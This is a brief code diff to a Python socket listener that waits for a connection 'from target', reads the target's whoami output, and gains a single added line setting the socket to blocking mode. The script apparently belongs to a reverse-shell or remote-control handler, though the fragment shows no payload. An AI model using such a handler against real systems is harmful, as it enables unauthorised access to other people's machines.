@@ -24,6 +24,7 @@ try:
     s.listen(5)
     print ("\nListening... Waiting for connection from target.\n")
     c, addr = s.accept()
+    s.setblocking(1)
     print ('Got connection from', addr )
     whoami = c.recv(1024).decode().strip()
 
